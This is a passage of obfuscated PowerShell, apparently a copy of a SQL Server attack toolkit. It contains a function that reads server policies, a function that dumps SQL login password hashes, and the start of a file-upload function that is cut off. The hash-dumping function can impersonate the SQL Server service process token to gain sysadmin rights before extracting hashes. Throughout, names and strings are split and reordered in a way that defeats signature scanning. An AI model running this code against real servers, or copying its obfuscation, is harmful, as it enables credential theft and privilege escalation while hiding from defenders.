         ${tBlw`InAUTOcRE`dS} 
    }
}






Function g`e`T-s`QlsER`VeRpo`LIcy
{
    
    [CmdletBinding()]
    Param(
        [Parameter(MAnDaTory = ${FA`lSe},
        hELPMESSaGe = {"{1}{7}{2}{5}{0}{4}{3}{8}{6}" -f 'to aut','SQL Server or d','accoun','e','h','t ','cate with.','omain ','nti'})]
        [string]${USE`Rn`AME},

        [Parameter(maNDatoRy = ${fa`LSe},
        hElpmeSsagE = {"{0}{13}{1}{11}{5}{4}{2}{8}{3}{12}{15}{10}{6}{14}{9}{7}"-f 'SQL Serve','r ','p','r',' ','nt','uthent','.','asswo','te with','a','domain accou','d ','r o','ica','to '})]
        [string]${pASS`WorD},

        [Parameter(mAndAtoRY = ${FA`l`se},
        HELPmEsSaGE = {"{3}{2}{1}{4}{0}"-f's.','tia','ndows creden','Wi','l'})]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]${CRED`En`TiAl} =  $0459M2::"Em`pty",

        [Parameter(manDATORY = ${F`A`LsE},
                ValUefrompipELInebYPROpERtYnAMe = ${TR`Ue},
        HelPmeSSAGe = {"{0}{9}{2}{5}{3}{4}{8}{7}{1}{6}"-f 'SQ','i','Serv','tance ','to c','er ins','on to.','nnect','o','L '})]
        [string]${Ins`T`ANce},

        [Parameter(ManDaToRY = ${FA`l`SE},
        heLpmEsSAGE = {"{0}{10}{8}{12}{11}{3}{6}{7}{13}{2}{1}{9}{5}{4}"-f'S','n fu','e','bose erro','rapped.','is w','rs','.  Used','p','nction ','u','s ver','pres',' wh'})]
        [switch]${SupP`ReSsverbo`SE}
    )

    Begin
    {
        
        ${TbLp`Oli`cY`In`FO} = &("{2}{3}{1}{0}" -f'ect','-Obj','N','ew') -TypeName ("{3}{4}{1}{2}{0}{5}"-f'a.DataTab','e','m.Dat','Sys','t','le')
    }

    Process
    {
        
        ${compU`TE`R`NAME} = &("{8}{1}{0}{6}{5}{7}{4}{2}{3}"-f'puterName','-Com','n','ce','ta','n','FromI','s','Get') -Instance ${I`NS`TANce}

        
        if(-not ${iNSTA`N`ce})
        {
            ${I`NsTanCE} = ${env`:C`o`M`PuTErnAMe}
        }

        
        ${tESTCO`NN`e`cTi`on} = &("{1}{2}{6}{5}{3}{4}{0}"-f 'ionTest','Ge','t-','Conne','ct','L','SQ') -Instance ${iNSt`AN`Ce} -Username ${Us`eRn`AME} -Password ${PasSw`OrD} -Credential ${C`R`EdeNtI`AL} -SuppressVerbose | &("{0}{3}{2}{1}"-f'Where','t','c','-Obje') -FilterScript {
            ${_}."sT`AtuS" -eq ("{0}{3}{1}{2}"-f'A','cessi','ble','c')
        }
        if(${tEsT`CoNn`e`CtIon})
        {
            if( -not ${su`pPRE`SSVe`Rb`osE})
            {
                &("{2}{1}{0}" -f 'bose','Ver','Write-') -Message ("$Instance "+': '+'Connect'+'io'+'n '+'Su'+'ccess.')
            }
        }
        else
        {
            if( -not ${S`U`ppRE`sSVe`Rb`OsE})
            {
                &("{2}{1}{3}{0}" -f 'bose','it','Wr','e-Ver') -Message ("$Instance "+': '+'C'+'onne'+'c'+'tion '+'Failed'+'.')
            }
            return
        }

        
        ${Q`U`ERY} = (' '+'-'+'- '+'Get'+'-'+'SQLServe'+'rP'+'ol'+'ic'+'y.sql '+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'S'+'E'+'LECT '+"'$ComputerName' "+'a'+'s '+'[C'+'om'+'pute'+'rN'+'ame],
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+"'$Instance' "+'a'+'s '+'[Insta'+'nc'+'e]'+',
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'p'+'.po'+'licy_id,
'+'	'+'	'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'p'+'.'+'name '+'a'+'s '+'[P'+'ol'+'i'+'c'+'yName'+'],
		 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'p.'+'condi'+'t'+'ion'+'_i'+'d,
		 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'c'+'.nam'+'e '+'a'+'s '+'[Condit'+'i'+'o'+'nN'+'ame],'+'
		'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'c.fac'+'e'+'t,
	'+'	 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'c.expre'+'ssion'+' '+'as'+' '+'['+'C'+'ondi'+'tionE'+'xp'+'ression'+']'+',
		 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'p.'+'ro'+'o'+'t_cond'+'it'+'io'+'n_id,
		 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'p'+'.is_enable'+'d,'+'
		 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'p.dat'+'e_'+'creat'+'ed,
	'+'	 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'p.'+'date_modi'+'fied,
'+'		'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'p.'+'descript'+'ion, '+'
	'+'	 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'p.'+'creat'+'ed'+'_'+'by, '+'
	'+'	 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'p.is_'+'system,'+'
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'t.target'+'_s'+'et'+'_id,
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'t.'+'TY'+'PE,
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'t.'+'ty'+'pe_ske'+'leton
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'FR'+'OM '+'msdb.dbo.'+'sy'+'s'+'p'+'oli'+'cy_'+'policies '+'p
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'IN'+'NER '+'JOIN'+' '+'msdb.db'+'o.sys'+'policy_c'+'ondit'+'ions '+'c '+'
	'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'O'+'N '+'p.c'+'o'+'ndit'+'i'+'on_id '+'= '+'c.c'+'on'+'diti'+'on_id
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'IN'+'NE'+'R '+'J'+'OIN '+'msdb.dbo.'+'s'+'ysp'+'olicy_t'+'arget_set'+'s '+'t'+'
	 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'ON'+' '+'t.obj'+'ect_'+'s'+'et'+'_id '+'= '+'p.'+'objec'+'t_set_id')

        
        ${TblpOLI`c`yinF`OteMP} = &("{1}{0}{3}{2}"-f 't-SQLQ','Ge','ery','u') -Instance ${I`Ns`T`AnCe} -Query ${qUe`RY} -Username ${Us`E`RNa`ME} -Password ${pa`ssw`ORD} -Credential ${CRe`d`ENTiAL} -SuppressVerbose

        
        ${T`BL`pOlICyiN`FO} = ${tbLp`O`lIcyIn`FO} + ${t`BLpo`Licyin`FOtemp}
    }

    End
    {
        
        ${P`OLN`UM} = ${t`BlpOLiC`Y`inFo}."C`ounT"
        if(${PO`Ln`Um} -eq 0){

            if( -not ${S`UppRe`Ssv`erb`Ose})
            {
                &("{1}{0}{4}{3}{2}"-f'rite','W','se','bo','-Ver') -Message ("$Instance "+': '+'No'+' '+'poli'+'c'+'ies '+'fo'+'un'+'d.')
            }
        }
        
        
        ${tbLpo`Li`cy`Info}
    }
}






Function  G`et-Sq`lS`Erve`RpASSW`oR`DHash
{
    
    [CmdletBinding()]
    Param(
        [Parameter(MandaTORY = ${f`Alse},
                vALuEFROMpiPElinebYprOPeRtYName = ${tR`UE},
        HelPmesSagE = {"{4}{1}{8}{5}{3}{2}{0}{7}{11}{14}{10}{12}{13}{9}{6}" -f'do',' ',' ','r','SQL','er o','th.','mai','Serv','ate wi','nt to ','n ac','authe','ntic','cou'})]
        [string]${u`S`erNAMe},

        [Parameter(mANDaToRY = ${fAl`sE},
                ValuEfROMPIpeLINEbYPrOPErTYname = ${tr`Ue},
        HELpMESSagE = {"{8}{14}{5}{7}{9}{12}{11}{0}{10}{3}{13}{15}{2}{1}{6}{4}" -f 'un','i','te w',' password to ','h.','or doma','t','in','SQL S',' a','t','o','cc','au','erver ','thentica'})]
        [string]${pa`S`sWORd},

        [Parameter(MaNDaTory = ${FAl`Se},
        HElpMEssAge = {"{3}{2}{1}{0}{4}"-f'ls','credentia','s ','Window','.'})]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]${CR`eDE`Nt`iAl} =   (  GeT-VaRIable ('04'+'59M2') -VALUEON)::"EM`Pty",

        [Parameter(MANdAtOry = ${fA`LSe},
                vAlUeFromPiPeLinEbYpRoPertynAme = ${T`RUE},
        HeLpMesSagE = {"{1}{0}{3}{5}{6}{2}{4}"-f' instan','SQL Server','nection','c',' to.','e ','to con'})]
        [string]${INSt`A`NCe},

        [Parameter(MAndatoRY = ${fa`lsE},
                vALUefrOmpiPeliNe = ${TR`UE},
                VAlUeFRompiPelINebYpropeRTyname = ${t`RUe},
        hElPMessagE = {"{4}{2}{0}{7}{1}{3}{5}{6}"-f 'p','to','inci',' fi','Pr','lter f','or.','al name '})]
        [string]${pRinCip`A`LNaMe},

        [Parameter(mAnDATOrY = ${FA`lSE},
        hElPMESsagE = {"{1}{3}{4}{0}{2}{5}"-f'L Serve','Mi','r ','gra','te to SQ','process.'})]
        [switch]${MIG`Ra`Te},

        [Parameter(mANDatOrY = ${F`A`lSE},
        HELpMeSsAGE = {"{7}{8}{3}{0}{1}{10}{9}{4}{12}{2}{11}{6}{5}" -f 'se errors.  Us','ed','ion is wrap','s verbo','unc','.','ed','Suppre','s','hen f',' w','p','t'})]
        [switch]${sUP`PrE`ssvE`RbOSE}
    )

    Begin
    {
        
        ${TBLPas`sWOrdh`As`hEs} = &("{1}{0}{2}"-f 'e','New-Obj','ct') -TypeName ("{4}{0}{5}{6}{1}{3}{2}" -f 'tem.Dat','a','le','Tab','Sys','a','.Dat')
        ${n`ULL} = ${tbLp`AS`Swo`RdHaSH`eS}."Co`lUmns".("{1}{0}" -f 'dd','A').Invoke(("{2}{3}{1}{0}" -f'Name','er','Compu','t'))
        ${n`Ull} = ${TBl`P`ASsW`oRdhASH`ES}."Col`UMNs".("{0}{1}" -f 'A','dd').Invoke(("{2}{0}{1}" -f'tan','ce','Ins'))
        ${N`Ull} = ${T`BLp`ASSWoR`Dh`ASheS}."C`OLUmns".("{1}{0}"-f 'd','Ad').Invoke(("{1}{2}{0}" -f 'alId','Princ','ip'))
        ${N`UlL} = ${t`BLpAsSWORD`H`ASH`Es}."coLu`MNs".("{1}{0}"-f'dd','A').Invoke(("{0}{1}{2}" -f 'Principa','l','Name'))
        ${NU`LL} = ${tBLPasS`W`o`RDhAS`HES}."c`OlUMNS".("{1}{0}" -f 'd','Ad').Invoke(("{1}{2}{3}{0}" -f 'palSid','Pri','nc','i'))
        ${nU`lL} = ${TBlp`A`s`SWOrdh`ASHES}."coLu`M`NS".("{1}{0}"-f 'd','Ad').Invoke(("{3}{2}{0}{4}{1}"-f'p','e','i','Princ','alTyp'))
        ${NU`ll} = ${t`B`LP`ASSwor`DhasHES}."cO`lumNs".("{1}{0}" -f'd','Ad').Invoke(("{0}{2}{1}" -f'Cr','ateDate','e'))
        ${N`ULl} = ${tb`lPA`ss`wOrd`H`ASHEs}."coLum`NS".("{0}{1}"-f 'Ad','d').Invoke(("{0}{2}{3}{1}" -f'Defa','seName','u','ltDataba'))
        ${NU`LL} = ${T`BLPa`SSWorDHA`ShEs}."coLu`mNs".("{0}{1}"-f'A','dd').Invoke(("{1}{2}{0}{3}"-f'dHas','Pass','wor','h'))

        
        if(${pR`iN`cipaLN`AmE})
        {
            ${P`RINcip`AL`NaMEf`i`LtEr} = (' '+'a'+'nd '+'nam'+'e '+'li'+'ke '+"'$PrincipalName'")
        }
        else
        {
            ${pri`NC`I`PaLN`AmefILter} = ''
        }
    }

    Process
    {
        

        
        ${comPUT`erNa`ME} = &("{4}{2}{1}{0}{3}"-f 'am','N','t-Computer','eFromInstance','Ge') -Instance ${I`NsTa`Nce}

        
        if(-not ${in`StANce})
        {
            ${iN`s`TAnCe} = ${E`Nv:`co`mpUTERNAMe}
        }

        
        ${TeSt`c`oNNE`Ct`IOn} = &("{1}{6}{3}{5}{4}{0}{2}" -f'nne','Get','ctionTest','S','o','QLC','-') -Instance ${IN`STA`N`cE} -Username ${us`ERNAme} -Password ${pA`sSWo`RD} -Credential ${c`Re`DeNTIal} -SuppressVerbose | &("{1}{2}{0}{3}" -f'e-','W','her','Object') -FilterScript {
            ${_}."S`TATUs" -eq ("{0}{1}{2}"-f'Acces','sibl','e')
        }

        if(${tEsT`c`onnECT`ION})
        {
            if( -not ${S`Up`PrES`sve`RBosE})
            {
                &("{0}{1}{2}" -f 'Write-Ve','rbo','se') -Message ("$Instance "+': '+'Conn'+'e'+'ct'+'ion '+'S'+'ucces'+'s.')
            }
        }else{
            if( -not ${SUpPrES`s`V`E`RBOse})
            {
                &("{0}{2}{1}{3}" -f 'W','e','rite-V','rbose') -Message ("$Instance "+': '+'C'+'o'+'nne'+'ction '+'F'+'a'+'iled.')
            }

            
            if(${m`I`GrATE})
            {
                
                ${wI`NcU`RreNtU`SERn`AMe} =  ( vaRiAble  UTnJP  -vaLU)::("{0}{2}{1}" -f 'GetC','nt','urre').Invoke()."N`Ame"

                
                ${I`sAdm`iN} = &("{4}{1}{5}{6}{0}{3}{2}" -f'he','t-SQLLoc','k','c','Ge','a','lAdminC')
                
                
                if(${I`sA`dMin} -ne ${tR`Ue}){
                    &("{1}{2}{0}{3}"-f'-verbos','writ','e','e')  ("$Instance "+': '+"$WinCurrentUserName "+'D'+'OES '+'NOT'+' '+'have'+' '+'l'+'ocal '+'admin'+' '+'privi'+'leg'+'e'+'s.')
                        return
                }else{
                    &("{1}{0}{2}"-f 'rite-ve','w','rbose')  ("$Instance "+': '+"$WinCurrentUserName "+'h'+'as '+'l'+'ocal '+'admi'+'n '+'pr'+'ivileg'+'es.')
                }

                
                &("{2}{0}{1}" -f 'er','bose','Write-V') -Message ("$Instance "+': '+'Impers'+'ona'+'ting '+'S'+'QL '+'Se'+'rver '+'pr'+'oces'+'s:') 
                [int]${ta`RgeT`Pid} = &("{1}{2}{0}{3}" -f 'i','Get-SQLS','erv','ceLocal') -SuppressVerbose -instance ${IN`stAN`Ce} -RunOnly | &("{3}{1}{0}{2}"-f'je','-Ob','ct','Where') {${_}."sEr`V`icEPA`Th" -like ("{3}{1}{0}{2}" -f 'servr.e','l','xe*','*sq')} | &("{3}{0}{2}{4}{1}"-f'e','t','ct-Obj','Sel','ec') ("{2}{1}{3}{0}" -f 'sId','ervicePro','S','ces') -ExpandProperty ("{0}{1}{2}" -f 'ServiceProces','sI','d')
                [string]${t`Ar`Gets`e`Rvi`CeAccOUNT} = &("{0}{3}{2}{4}{5}{1}"-f 'Get-SQL','ocal','ervi','S','ce','L') -SuppressVerbose -instance ${inS`TAN`Ce} -RunOnly | &("{2}{0}{1}{3}" -f'here-Ob','jec','W','t') {${_}."se`R`VIceP`AtH" -like ("{2}{1}{0}{3}{4}" -f'q','s','*','ls','ervr.exe*')} | &("{0}{1}{2}" -f 'Sele','ct-Ob','ject') ("{0}{3}{2}{1}{4}"-f 'S','u','iceAcco','erv','nt') -ExpandProperty ("{3}{1}{4}{2}{0}"-f 't','A','coun','Service','c')
                
                
                if (${T`A`RGEtPId} -eq 0){
                    &("{3}{1}{0}{2}"-f 'te-Verb','i','ose','Wr') -Message ("$Instance "+': '+'N'+'o '+'proce'+'ss '+'ru'+'n'+'ning '+'fo'+'r '+'p'+'rovided '+'instan'+'c'+'e...')
                    return
                }

                
                &("{1}{3}{2}{0}" -f'se','Write-V','o','erb') -Message ("$Instance "+': '+'- '+'P'+'r'+'ocess '+'ID'+': '+"$TargetPid")
                &("{2}{0}{1}" -f'-V','erbose','Write') -Message ("$Instance "+': '+'- '+'Servic'+'eAccount'+': '+"$TargetServiceAccount") 
                
                
                try{
                    &("{0}{1}{2}{3}" -f'Get','-P','r','ocess') | &("{1}{0}{2}{3}"-f 'ere','Wh','-Ob','ject') {${_}."ID" -like ${TAr`G`EtP`id}} | &("{0}{4}{3}{1}{2}"-f'I','Manipula','tion','n','nvoke-Toke') -Instance ${iN`Stan`ce} -ImpersonateUser -ErrorAction ("{0}{1}{2}" -f 'C','o','ntinue') | &("{2}{1}{0}"-f'-Null','t','Ou')               
                }catch{
                    ${ER`RoRME`Ss`A`gE} = ${_}."eXCEpT`I`On"."ME`SSAGe"
                    &("{0}{1}{2}"-f 'W','rite','-Verbose') -Message ("$Instance "+': '+'Imp'+'e'+'rs'+'onation'+' '+'fai'+'l'+'ed.')
                    &("{1}{0}{2}" -f'ite-V','Wr','erbose')  -Message (' '+"$Instance "+': '+"$ErrorMessage")
                    return
                }
            }else{            
                return
            }
        }            

        
        ${I`s`S`ySAdMiN} = &("{0}{4}{2}{1}{3}" -f'Get-SQLSy','dminCh','a','eck','s') -Instance ${In`S`TAn`Ce} -Credential ${cRedE`N`TiAl} -Username ${U`SER`NAme} -Password ${pA`S`Sw`oRD} -SuppressVerbose | &("{2}{1}{0}"-f'ect','-Obj','Select') -Property ("{1}{3}{2}{0}" -f'min','IsS','ad','ys') -ExpandProperty ("{2}{1}{0}" -f 'admin','sSys','I')

        if(${I`SS`YSadmin} -eq 'Yes')
        {
            &("{3}{1}{4}{0}{2}"-f 'er','ite-','bose','Wr','V') -Message ("$Instance "+': '+'You'+' '+'a'+'re '+'a '+'sysadm'+'i'+'n.')
        }
        else
        {
            &("{1}{2}{4}{0}{3}" -f 'Verbos','Wr','it','e','e-') -Message ("$Instance "+': '+'Y'+'ou '+'a'+'re '+'not'+' '+'a '+'sy'+'sad'+'m'+'in.')
            if(${M`IGRA`Te})
            {
                
                ${wInCur`R`eNtUs`ErN`A`ME} =   $utNjP::("{0}{1}{2}"-f'GetC','urr','ent').Invoke()."Na`mE"

                
                ${I`S`ADmIN} = &("{3}{4}{6}{0}{5}{1}{2}" -f 'in','c','k','Get-','SQLLoc','Che','alAdm')
                
                
                if(${isA`Dm`IN} -ne ${t`RUE}){
                    &("{2}{0}{1}" -f 'te-ve','rbose','wri')  ("$Instance "+': '+"$WinCurrentUserName "+'D'+'OES '+'NOT'+' '+'have'+' '+'lo'+'c'+'al '+'admin'+' '+'p'+'ri'+'vi'+'leges.')
                        return
                }else{
                    &("{1}{0}{2}" -f '-verbo','write','se')  ("$Instance "+': '+"$WinCurrentUserName "+'has'+' '+'loca'+'l '+'adm'+'in '+'p'+'rivi'+'l'+'eges.')
                }

                
                 &("{1}{3}{0}{2}" -f'-Verb','Writ','ose','e') -Message ("$Instance "+': '+'Impers'+'on'+'ati'+'ng '+'S'+'QL '+'S'+'erver '+'proces'+'s:')  
                [int]${taR`gET`PId} = &("{2}{1}{0}{3}" -f'LServiceL','SQ','Get-','ocal') -SuppressVerbose -instance ${I`NST`ANCe} -RunOnly | &("{3}{1}{2}{0}" -f 'ject','re-O','b','Whe') {${_}."sE`RVIce`Pa`Th" -like ("{1}{0}{3}{2}" -f 'se','*sql','r.exe*','rv')} | &("{0}{4}{2}{1}{3}"-f 'Selec','e','-Obj','ct','t') ("{0}{2}{1}" -f'ServicePro','ssId','ce') -ExpandProperty ("{1}{2}{3}{0}{4}" -f'es','ServiceP','ro','c','sId')
                [string]${t`ARGET`Se`R`Vi`CeAcCOunT} = &("{1}{3}{2}{0}" -f 'l','Get-SQ','rviceLoca','LSe') -SuppressVerbose -instance ${INstA`N`ce} -RunOnly | &("{1}{2}{0}"-f 'bject','Where','-O') {${_}."SE`RVI`c`EPatH" -like ("{2}{1}{0}" -f '.exe*','rvr','*sqlse')} | &("{3}{0}{1}{2}" -f't-Ob','j','ect','Selec') ("{3}{0}{2}{1}" -f'e','count','rviceAc','S') -ExpandProperty ("{0}{2}{3}{1}" -f'S','t','erviceAc','coun')
                
                
                if (${TARgE`T`P`iD} -eq 0){
                    &("{0}{1}{2}" -f'Wri','te','-Verbose') -Message ("$Instance "+': '+'N'+'o '+'proc'+'ess'+' '+'ru'+'nn'+'ing '+'for'+' '+'prov'+'i'+'ded '+'i'+'ns'+'tance.'+'..')
                    return
                }

                
                &("{0}{2}{1}"-f 'Write','bose','-Ver') -Message ("$Instance "+': '+'- '+'Proces'+'s'+' '+'ID'+': '+"$TargetPid")
                &("{0}{2}{1}" -f'Write','ose','-Verb') -Message ("$Instance "+': '+'- '+'Ser'+'vic'+'eA'+'c'+'co'+'unt: '+"$TargetServiceAccount") 
                
                
                try{
                    &("{1}{0}{2}"-f 'r','Get-P','ocess') | &("{2}{1}{0}{3}"-f 'b','e-O','Wher','ject') {${_}."I`D" -like ${TarG`ETP`ID}} | &("{6}{5}{0}{4}{1}{3}{2}"-f'enMa','p','ion','ulat','ni','oke-Tok','Inv') -Instance ${iNST`An`ce} -ImpersonateUser -ErrorAction ("{2}{0}{1}" -f 'o','ntinue','C') | &("{1}{2}{0}" -f'll','O','ut-Nu')               
                }catch{
                    ${erRORMeS`S`A`gE} = ${_}."ExCe`P`TioN"."M`EsS`Age"
                    &("{3}{2}{1}{0}" -f 'rbose','e-Ve','rit','W') -Message ("$Instance "+': '+'Imp'+'erso'+'na'+'tion '+'fail'+'ed.')
                    &("{2}{1}{0}"-f 'te-Verbose','ri','W')  -Message (' '+"$Instance "+': '+"$ErrorMessage")
                    return
                }
            }else{
                return
            }
        
        }

        
        &("{2}{4}{0}{1}{3}" -f'it','e','W','-Verbose','r') -Message ("$Instance "+': '+'A'+'ttemptin'+'g '+'t'+'o '+'d'+'ump '+'pas'+'swor'+'d '+'ha'+'shes.')

        
        ${SQlV`Ersio`NF`U`LL} = &("{0}{3}{2}{1}"-f'Get-SQLSe','rInfo','ve','r') -Instance ${i`NST`AnCe} -Username ${USER`NAmE} -Password ${PaS`s`word} -Credential ${C`R`e`DenTIal} -SuppressVerbose | &("{0}{1}{3}{2}"-f'Se','lect-Obj','t','ec') -Property ("{0}{3}{2}{4}{1}"-f 'SQLServ','Number','rVer','e','sion') -ExpandProperty ("{6}{5}{1}{2}{4}{3}{0}"-f'r','V','ers','Numbe','ion','erver','SQLS')
        if(${Sq`LVe`Rs`IoNfuLL})
        {
            ${SqlV`E`RSiOns`hO`RT} = ${SQl`VERS`I`ONfUll}.("{0}{1}" -f 'Spl','it').Invoke('.')[0]
        }

        if([int]${Sq`LverSI`O`NsHO`Rt} -le 8)
        {

            
            ${Q`UE`RY} = ('USE'+' '+'ma'+'st'+'er;
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'SE'+'L'+'ECT '+"'$ComputerName' "+'as'+' '+"[ComputerName],'$Instance' "+'as'+' '+'[In'+'sta'+'nc'+'e],
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'na'+'me '+'a'+'s '+'['+'PrincipalNa'+'me'+'],
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'c'+'reat'+'ed'+'ate '+'as'+' '+'['+'C'+'rea'+'teDate]'+',
			 '+' '+' '+' '+'db'+'name '+'as'+' '+'['+'Def'+'a'+'u'+'ltDat'+'abaseNa'+'me],
			 '+' '+' '+' '+'p'+'a'+'sswor'+'d '+'as'+' '+'['+'Pa'+'ssw'+'ordHas'+'h]
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'FRO'+'M '+'['+'sysxlogins'+']')
        }
		else
        {
            
            ${QUe`RY} = ('USE'+' '+'master'+';'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'SELEC'+'T '+"'$ComputerName' "+'a'+'s '+"[ComputerName],'$Instance' "+'as'+' '+'[In'+'s'+'tance],
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'nam'+'e '+'as'+' '+'[Pr'+'in'+'c'+'ipalN'+'a'+'me],
			'+' '+' '+' '+' '+'pr'+'incipa'+'l_id '+'as'+' '+'[Pr'+'incipalId'+'],
'+'		'+'	 '+' '+' '+' '+'typ'+'e'+'_desc '+'a'+'s '+'['+'Pri'+'ncip'+'alTy'+'pe'+'],
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'s'+'id '+'a'+'s '+'['+'Principa'+'l'+'Sid'+'],
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'cre'+'ate_'+'dat'+'e '+'as'+' '+'[Create'+'Date],
'+'		'+'	 '+' '+' '+' '+'defau'+'lt'+'_da'+'t'+'aba'+'se_name'+' '+'as'+' '+'[Defaul'+'tData'+'baseName]'+',
			'+' '+' '+' '+' '+'[sys]'+'.fn_'+'varbinto'+'hex'+'str'+'(password_'+'h'+'as'+'h)'+' '+'a'+'s '+'['+'Passw'+'o'+'rdHas'+'h]
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'F'+'ROM '+'[sys]'+'.'+'[sql_l'+'ogin'+'s]')
        }

        
        ${Tbl`RE`sU`lTS} = &("{3}{1}{0}{2}"-f 't-S','e','QLQuery','G') -Instance ${I`N`StAnce} -Query ${q`UERy} -Username ${u`SE`RNA`mE} -Password ${P`A`sSwO`Rd} -Credential ${cR`edEnTi`Al} -SuppressVerbose

        
        ${Tb`lre`su`lTs} |
        &("{1}{3}{2}{0}"-f'ct','ForEa','bje','ch-O') -Process {
            
            ${new`sid} =  $LCs2::("{1}{0}{2}"-f't','ToS','ring').Invoke(${_}."p`R`INCiPALsid").("{1}{0}{2}"-f'pla','Re','ce').Invoke('-','')
            if (${N`E`wSid}."LeN`gTh" -le 10)
            {
                ${S`iD} =   (VarIaBLE qMrK -vALUeonlY)::("{0}{2}{1}"-f'ToIn','2','t3').Invoke(${nEWS`Id},16)
            }
            else
            {
                ${S`id} = ${ne`wsID}
            }

            
            ${n`UlL} = ${TB`l`pAsSWoR`d`HASheS}."R`OwS"."a`DD"(
                [string]${_}."COm`puTeR`NAMe",
                [string]${_}."in`STa`NCe",
                [string]${_}."pR`iNc`IPA`LId",
                [string]${_}."PRinC`IP`ALNAmE",
                ${s`Id},
                [string]${_}."pRi`N`CIPALT`yPe",
                ${_}."creaT`Ed`Ate",
                [string]${_}."Defa`U`lT`daTAbAsena`mE",
                [string](-join('0x0',((${_}."Pa`S`SWoR`dhash").("{0}{1}"-f 'ToUppe','r').Invoke().("{1}{2}{0}{3}"-f't','Tr','imS','art').Invoke("0X"))))
                )
        }

        
        &("{2}{3}{1}{4}{0}" -f 'bose','ite-V','W','r','er') -Message ("$Instance "+': '+'Atte'+'mpt '+'com'+'plet'+'e.')
        
        
        if(${mi`grA`Te}){          
            &("{3}{1}{2}{0}{5}{4}"-f 'e-Toke','vo','k','In','ulation','nManip') -RevToSelf | &("{1}{0}{2}"-f'ut-N','O','ull')
        }       
    }

    End
    {

        
        ${pA`ss`wOrDHasH`c`O`UNT} = ${T`B`l`Pa`sSWorD`HasHES}."Ro`ws"."co`UNT"
        &("{2}{1}{0}" -f 'e','-verbos','write') ("$PasswordHashCount "+'pas'+'sw'+'ord '+'hashe'+'s '+'r'+'ec'+'overed.')

        
        if(${pA`ss`wO`Rd`HAShCOUNt} -gt 0){

            
            ${TB`LPAssW`O`RDhAshes}            
        }
    }
}















Function  INvOKE-sQ`L`UP`loAD`FILEolE
{
    
    [CmdletBinding()]
    Param(
        [Parameter(maNDatORY = ${f`AlSE},
        HELPMESSage = {"{9}{0}{4}{1}{8}{7}{6}{10}{5}{11}{2}{12}{3}" -f ' Serve',' o','then','te with.','r','t',' ','ain','r dom','SQL','accoun',' to au','tica'})]
        [string]${U`SErN`AME},

        [Parameter(mAndAtOry = ${F`A`lSE},
        helPMEsSAGE = {"{1}{7}{6}{2}{9}{3}{8}{4}{0}{5}"-f'ate wit','SQL Server or domain','w','o a','entic','h.','pass',' account ','uth','ord t'})]
        [string]${Pa`Ss`WOrd},

        [Parameter(MaNdAtory = ${fa`Lse},
        helPMEsSAge = {"{3}{4}{5}{1}{2}{0}" -f's.','nti','al','Window','s cred','e'})]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]${cRe`DEntI`AL} =  (gEt-vARIaBLe  0459M2 ).vaLUe::"EMP`TY",

        [Parameter(MANDaToRy = ${f`A`LSe},
                VaLUeFrOmpIPElinE = ${t`RuE},
                vALUeFROmPipElIneBYpROPErTYname = ${tR`Ue},
        HeLpmEsSaGe = {"{6}{5}{9}{4}{1}{10}{3}{0}{2}{8}{7}" -f'ct','o c','ion ','nne',' t','QL Se','S','.','to','rver instance','o'})]
        [string]${In`sTa`NcE},

        [Parameter(manDAToRy = ${fa`LsE},
        HElpmESsAGe = {"{6}{3}{7}{0}{5}{1}{4}{2}" -f 't ','ng De','ated Admin Connection.','onn','dic','usi','C','ec'})]
        [Switch]${D`AC},

        [Parameter(MaNdAtory = ${t`Rue},
